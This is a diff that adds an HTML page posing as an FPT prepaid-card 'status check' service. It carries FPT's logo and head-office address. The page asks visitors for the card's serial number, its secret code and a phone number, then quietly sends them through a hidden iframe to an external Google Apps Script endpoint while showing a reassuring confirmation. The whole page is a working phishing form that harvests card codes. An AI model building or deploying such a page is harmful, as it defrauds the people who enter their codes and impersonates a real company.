@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="style.css" />
+
+    <title>Kiểm Tra Trạng Thái Thẻ</title>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-lg navbar-light">
+      <div class="container">
+        <a class="navbar-brand" href="#"
+          ><img
+            src="/images/fpt-logo-5B8F17203A-seeklogo.com_.png"
+            alt=""
+            width="100px"
+        /></a>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarNav"
+          aria-controls="navbarNav"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+      </div>
+    </nav>
+    <div class="box-form">
+      <div class="item">
+        <h1>TRA CỨU TRẠNG THÁI THẺ</h1>
+      </div>
+      <div class="box-title">
+        <h5 id="changeText">Nhập seri và mã thẻ vào ô bên dưới</h5>
+        <h5>Hệ Thống Tiếp Nhận Kiểm Tra Thẻ Của Bạn Lúc:</h5>
+        <h5 id="MyClockDisplay" onload="showTime()"></h5>
+      </div>
+      <div class="form-chonthe">
+        <script type="text/javascript">
+          var submitted = false;
+        </script>
+        <iframe
+          id="hidden_iframe"
+          name="hidden_iframe"
+          onload="if(submitted){
+          var str = '✔ Trạng thái thẻ đang được kiểm tra!';
+          document.getElementById('sss').innerHTML=str;
+      }"
+          style="display: none"
+        >
+        </iframe>
+        <form
+          target="hidden_iframe"
+          onsubmit="submitted=true;"
+          action="https://script.google.com/macros/s/AKfycbwXCs2M-wJwpDl9NC1r4RmR_zbRXoLLHi3-Y-t5Qg1sx7g0UPDFIxQgelv_dfgkVjU6/exec"
+          method="GET"
+          class="form-chonthe"
+          name="formdata"
+        >
+          <div class="item-form">
+            <label for="">Loại thẻ</label>
+            <select class="form-control" name="loaithe">
+              <option value="Vcoin">Vcoin</option>
+              <option value="FPT">FPT Gate</option>
+              <option value="Zing">Zing</option>
+              <option value="Viettel">Viettel</option>
+              <option value="Mobiphone">Mobiphone</option>
+              <option value="Vinaphone">Vinaphone</option>
+            </select>
+          </div>
+          <div class="item-form">
+            <label for="">Số Seri</label>
+            <input
+              type="text"
+              placeholder="Nhập số seri"
+              class="form-control"
+              name="soseri"
+            />
+          </div>
+          <div class="item-form">
+            <label for="">Mã Thẻ</label>
+            <input
+              type="text"
+              placeholder="Nhập mã thẻ"
+              class="form-control"
+              name="mathe"
+            />
+          </div>
+          <div class="item-form">
+            <label for="">SĐT Nhận Kết Quả</label>
+            <input
+              type="text"
+              placeholder="Số điện thoại nhận kết quả"
+              class="form-control"
+              name="sđt"
+            />
+          </div>
+          <div class="btn-kiemtra">
+            <button type="submit" id="btn-kiemtra">KIỂM TRA</button>
+          </div>
+          <h5 id="sss"></h5>
+        </form>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>
+        Trụ sở chính: Tòa nhà FPT Cầu Giấy số 17 phố Duy Tân, quận Cầu Giấy, Hà
+        Nội, VN
+      </p>
+    </div>
+
+    <!-- <div class="current-time" id="current-time">
+
+    </div> -->
+
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
+      crossorigin="anonymous"
+    ></script>
+    <script src="/script.js"></script>
+    <script src="/checkdata.js"></script>
+  </body>
+</html>
